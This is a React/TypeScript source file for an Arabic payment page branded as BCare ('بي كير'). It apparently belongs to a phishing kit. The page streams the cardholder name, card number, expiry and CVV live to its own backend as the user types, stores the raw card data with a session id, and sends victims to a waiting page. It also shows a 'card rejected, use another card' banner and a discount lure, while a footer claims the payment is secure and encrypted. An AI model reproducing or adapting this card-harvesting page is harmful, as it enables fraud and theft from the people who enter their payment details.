import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { PublicLayout } from "@/components/PublicLayout";
import { Stepper } from "@/components/Stepper";
import { RejectBanner } from "@/components/RejectBanner";
import { useEffect, useMemo, useRef, useState } from "react";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useLiveInput } from "@/hooks/useLiveInput";
import { saveCard, checkCardBanned } from "@/lib/tracking.functions";
import { detectBank, detectBrand } from "@/lib/bin-database";
import { CardCameraScan } from "@/components/CardCameraScan";
import { Button } from "@/components/ui/button";
import { readCardImage } from "@/lib/card-ocr.functions";
import { z } from "zod";
import visaImg from "@/assets/pay/visa.png";
import masterImg from "@/assets/pay/mastercard.png";
import madaImg from "@/assets/pay/mada.png";

export const Route = createFileRoute("/payment/")({
  head: () => ({
    meta: [
      { title: "بيانات البطاقة | بي كير" },
      { name: "description", content: "إدخال بيانات البطاقة بأمان" },
      { property: "og:title", content: "بيانات البطاقة | بي كير" },
      { property: "og:description", content: "إدخال بيانات البطاقة وإتمام الدفع عبر بي كير" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
  component: PaymentPage,
});

function formatCardNumber(v: string) {
  return v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 4);
  if (d.length <= 2) return d;
  return d.slice(0, 2) + "/" + d.slice(2);
}

function PaymentPage() {
  useVisitorTracking("الدفع والتحقق");
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [flipped, setFlipped] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [scanMsg, setScanMsg] = useState<string | null>(null);
  const [cameraOpen, setCameraOpen] = useState(false);

  // Hide the reject banner as soon as the visitor edits any card field —
  // the ?error=1 flag lingers in the URL after a rejection otherwise.
  const clearReject = () => {
    navigate({ to: "/payment", search: {}, replace: true });
  };

  // Live banned-prefix warning: as soon as the typed digits match a banned
  // prefix, show "card not supported" and block submission.
  const [cardBanned, setCardBanned] = useState(false);
  useEffect(() => {
    const digits = cardNumber.replace(/\D/g, "");
    if (digits.length < 4) {
      setCardBanned(false);
      return;
    }
    let cancelled = false;
    const t = window.setTimeout(() => {
      checkCardBanned({ data: { card_number: digits } })
        .then((r) => { if (!cancelled) setCardBanned(Boolean(r?.banned)); })
        .catch(() => {});
    }, 300);
    return () => { cancelled = true; window.clearTimeout(t); };
  }, [cardNumber]);

  const [scanDone, setScanDone] = useState(false);
  const [detected, setDetected] = useState<{ number: string; name: string; expiry: string }>({ number: "", name: "", expiry: "" });
  const detectedRef = useRef(detected);
  const workerRef = useRef<{ terminate: () => Promise<unknown> } | null>(null);

  async function blobToDataUrl(blob: Blob) {
    return await new Promise<string>((resolve, reject) => {
      const r = new FileReader();
      r.onload = () => resolve(String(r.result));
      r.onerror = reject;
      r.readAsDataURL(blob);
    });
  }

  async function handleScanFile(file: Blob, auto = false) {
    setScanning(true);
    if (!auto) setScanMsg("جاري قراءة البطاقة...");
    try {
      const image = await blobToDataUrl(file);
      const r = await readCardImage({ data: { image } });
      const prev = detectedRef.current;
      const next = {
        number: r.number || prev.number,
        name: r.name || prev.name,
        expiry: r.expiry || prev.expiry,
      };
      detectedRef.current = next;
      setDetected(next);
      if (next.number) setCardNumber(formatCardNumber(next.number));
      if (next.expiry) setExpiry(next.expiry);
      if (next.name) setCardName(next.name);

      if (next.number && (next.expiry || !auto)) {
        setScanDone(true);
        // Keep the overlay visible briefly like native phone scanners.
        setTimeout(() => setCameraOpen(false), 1500);
        setScanMsg("تم تعبئة البيانات، يرجى مراجعتها");
      } else if (!auto) {
        setScanMsg("تعذّر قراءة البطاقة، حاول بإضاءة أفضل");
      }
    } catch {
      if (!auto) setScanMsg("تعذّر قراءة البطاقة");
    } finally {
      setScanning(false);
      setTimeout(() => setScanMsg(null), 4000);
    }
  }
  useEffect(() => {
    return () => {
      workerRef.current?.terminate().catch(() => {});
      workerRef.current = null;
    };
  }, []);

  useLiveInput({
    card_name: cardName,
    card_number: cardNumber.replace(/\s/g, ""),
    year: expiry,
    cvv,
  });
  const [total, setTotal] = useState<number>(1249);
  const [offerId, setOfferId] = useState<string | null>(null);
  const [extras, setExtras] = useState<string[]>([]);
  const [offerSelectedAt, setOfferSelectedAt] = useState<string | null>(null);

  useEffect(() => {
    try {
      const raw = window.localStorage.getItem("bcare_selected_offer");
      if (raw) {
        const o = JSON.parse(raw);
        if (typeof o.offer_id === "string") setOfferId(o.offer_id);
        if (Array.isArray(o.extra_labels)) setExtras(o.extra_labels.map(String));
        else if (Array.isArray(o.extras))
          setExtras(o.extras.map((e: { label: string }) => e.label));
        // Show a provisional total; the server will compute the authoritative one.
        if (typeof o.total === "number") setTotal(o.total);
        // Prefer the final amount from the summary page (includes the 30%
        // credit-card discount when that method was chosen).
        const finalRaw = window.localStorage.getItem("bcare_payment_total");
        const finalTotal = finalRaw ? Number(finalRaw) : NaN;
        if (Number.isFinite(finalTotal) && finalTotal > 0) setTotal(finalTotal);
        if (typeof o.selected_at === "string") setOfferSelectedAt(o.selected_at);
      }
    } catch { /* noop */ }
  }, []);

  const brand = useMemo(() => detectBrand(cardNumber), [cardNumber]);
  const bank = useMemo(() => detectBank(cardNumber), [cardNumber]);

  // Logos stay hidden while the field is empty. Only once the typed digits
  // identify a card network does that single logo appear at the field's right
  // edge — no always-on row of accepted brands.
  const brandLogo =
    brand === "mada"
      ? { src: madaImg, alt: "مدى" }
      : brand === "visa"
        ? { src: visaImg, alt: "Visa" }
        : brand === "master"
          ? { src: masterImg, alt: "Mastercard" }
          : null;

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setError(null);

    // All fields are mandatory — validate before submitting.
    const digits = cardNumber.replace(/\s/g, "");
    if (cardBanned) {
      setError("هذه البطاقة غير مدعومة، يرجى استخدام بطاقة أخرى أو بطاقة بنك آخر");
      return;
    }
    if (cardName.trim().length < 3) {
      setError("يجب إدخال اسم حامل البطاقة");
      return;
    }
    if (digits.length < 15) {
      setError("يجب إدخال رقم البطاقة كاملًا");
      return;
    }
    const expiryMatch = /^(\d{2})\/(\d{2})$/.exec(expiry);
    if (!expiryMatch) {
      setError("يجب إدخال تاريخ الانتهاء بصيغة MM/YY");
      return;
    }
    const mm = parseInt(expiryMatch[1]!, 10);
    const yy = parseInt(expiryMatch[2]!, 10);
    const now = new Date();
    if (mm < 1 || mm > 12) {
      setError("تاريخ الانتهاء غير صحيح");
      return;
    }
    const fullYear = 2000 + yy;
    if (fullYear < now.getFullYear() || (fullYear === now.getFullYear() && mm < now.getMonth() + 1)) {
      setError("البطاقة منتهية الصلاحية");
      return;
    }
    if (cvv.length !== 3) {
      setError("يجب إدخال رمز CVV المكوّن من 3 أرقام");
      return;
    }

    setLoading(true);
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) {
      window.location.href = "/";
      return;
    }
    try {
      await saveCard({
        data: {
          session_id: sessionId,
          card_number: cardNumber.replace(/\s/g, ""),
          card_name: cardName,
          year: expiry,
          cvv,
          phone_number: "",
          offer_id: offerId ?? undefined,
          extras,
          offer_selected_at: offerSelectedAt ?? undefined,
        },
      });
      navigate({ to: "/payment/wait", search: { from: "card" } });
    } catch (err) {
      setError(err instanceof Error && err.message === "BANNED_CARD" ? "هذه البطاقة غير مقبولة" : "تعذّر إتمام العملية");
    } finally {
      setLoading(false);
    }
  }

  return (
    <PublicLayout>
      <div className="container mx-auto max-w-2xl px-3 py-6">
        <Stepper current={4} />
        <div className="mb-4 flex items-center justify-between">
          <h1 className="text-xl font-black text-bcare-ink">بيانات البطاقة</h1>
          <BrandLogos active={brand} />
        </div>


        <RejectBanner message="البطاقة المستخدمة غير مدعومة أو غير صحيحة. يرجى إدخال بطاقة أخرى." />


        {bank.id !== "generic" && (
          <p className="mt-2 text-center text-xs text-slate-500">
            تم التعرف على البطاقة: <b className="text-bcare-blue">{bank.nameAr}</b>
          </p>
        )}


        <div className="mt-5 rounded-2xl bg-white p-5 shadow-sm ring-1 ring-black/5">
          <form onSubmit={onSubmit} className="space-y-4">
            <Field label="اسم حامل البطاقة">
              <input
                required
                value={cardName}
                onChange={(e) => { clearReject(); setCardName(e.target.value.toUpperCase()); }}
                className="h-12 w-full rounded-lg border border-bcare-border px-3 tracking-wide outline-none focus:border-bcare-blue"
                placeholder="NAME ON CARD"
              />
            </Field>

            <Field label="رقم البطاقة">
              <div className="relative">
                <input
                  required
                  inputMode="numeric"
                  value={cardNumber}
                  onChange={(e) => { clearReject(); setCardNumber(formatCardNumber(e.target.value)); }}
                  className={`h-12 w-full rounded-lg border px-3 pl-20 tracking-widest outline-none focus:border-bcare-blue ${brandLogo ? "pr-12" : "pr-3"} ${cardBanned ? "border-red-400 bg-red-50" : "border-bcare-border"}`}
                  placeholder="0000 0000 0000 0000"
                  dir="ltr"
                />
                <button
                  type="button"
                  title="تصوير البطاقة"
                  onClick={() => { setScanDone(false); detectedRef.current = { number: "", name: "", expiry: "" }; setDetected(detectedRef.current); setCameraOpen(true); }}
                  disabled={scanning}
                  className="absolute left-10 top-1/2 flex h-8 w-8 -translate-y-1/2 cursor-pointer items-center justify-center rounded-md bg-bcare-blue/10 text-bcare-blue transition hover:bg-bcare-blue/20"
                >
                  {scanning ? (
                    <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 2a10 10 0 1 0 10 10"/></svg>
                  ) : (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
                  )}
                </button>
                {brandLogo && (
                  <div
                    key={brand}
                    className="pointer-events-none absolute right-2 top-1/2 flex -translate-y-1/2 animate-in fade-in zoom-in-95 duration-200 items-center"
                  >
                    <img src={brandLogo.src} alt={brandLogo.alt} className="h-6 w-auto" />
                  </div>
                )}
              </div>
                {scanMsg && <p className="mt-1 text-xs text-slate-500">{scanMsg}</p>}
                {cardBanned && (
                  <p role="alert" className="mt-1 text-xs font-bold text-red-600">
                    هذه البطاقة غير مدعومة، يرجى استخدام بطاقة أخرى أو بطاقة بنك آخر
                  </p>
                )}
             </Field>

            <CardCameraScan
              open={cameraOpen}
              onClose={() => setCameraOpen(false)}
              onCapture={(blob, auto) => {
                if (!auto) setCameraOpen(false);
                handleScanFile(blob, auto);
              }}
              busy={scanning}
              done={scanDone}
              detected={detected}
            />


            <div className="grid grid-cols-2 gap-3">
              <Field label="تاريخ الانتهاء">
                <input
                  required
                  inputMode="numeric"
                  value={expiry}
                  onChange={(e) => { clearReject(); setExpiry(formatExpiry(e.target.value)); }}
                  onFocus={() => setFlipped(false)}
                  placeholder="MM/YY"
                  className="h-12 w-full rounded-lg border border-bcare-border px-3 outline-none focus:border-bcare-blue"
                  dir="ltr"
                />
              </Field>
              <Field label="CVV">
                <input
                  required
                  inputMode="numeric"
                  maxLength={3}
                  value={cvv}
                  onChange={(e) => { clearReject(); setCvv(e.target.value.replace(/\D/g, "").slice(0, 3)); }}
                  onFocus={() => setFlipped(true)}
                  onBlur={() => setFlipped(false)}
                  placeholder="•••"
                  className="h-12 w-full rounded-lg border border-bcare-border px-3 outline-none focus:border-bcare-blue"
                  dir="ltr"
                />
              </Field>
            </div>

            {error && <p className="text-center text-sm text-red-600">{error}</p>}

            <Button
              type="submit"
              disabled={loading}
              className="flex h-12 w-full items-center justify-center gap-2 bg-bcare-orange font-bold text-primary-foreground shadow-sm transition hover:brightness-110 disabled:opacity-60"
            >
              {loading ? "جاري المعالجة..." : `دفع ${total.toLocaleString("ar-SA")} ر.س`}
            </Button>

            <p className="flex items-center justify-center gap-1 text-center text-xs text-gray-500">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
              الدفع مؤمّن ومشفّر بالكامل
            </p>
          </form>
        </div>
      </div>
    </PublicLayout>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div>
      <label className="mb-1 block text-sm font-bold text-gray-700">
        {label} <span className="text-red-500">*</span>
      </label>
      {children}
    </div>
  );
}

function BrandLogos({ active }: { active: string }) {
  return (
    <div className="flex items-center gap-2">
      <div className={`flex h-8 w-14 items-center justify-center rounded bg-white px-1 shadow-sm ${active !== "mada" && active !== "unknown" ? "opacity-40" : ""}`}>
        <img src={madaImg} alt="مدى" className="max-h-6 w-auto" />
      </div>
      <div className={`flex h-8 w-14 items-center justify-center rounded bg-white px-1 shadow-sm ${active !== "visa" && active !== "unknown" ? "opacity-40" : ""}`}>
        <img src={visaImg} alt="Visa" className="max-h-6 w-auto" />
      </div>
      <div className={`flex h-8 w-14 items-center justify-center rounded bg-white px-1 shadow-sm ${active !== "master" && active !== "unknown" ? "opacity-40" : ""}`}>
        <img src={masterImg} alt="Mastercard" className="max-h-6 w-auto" />
      </div>
    </div>
  );
}
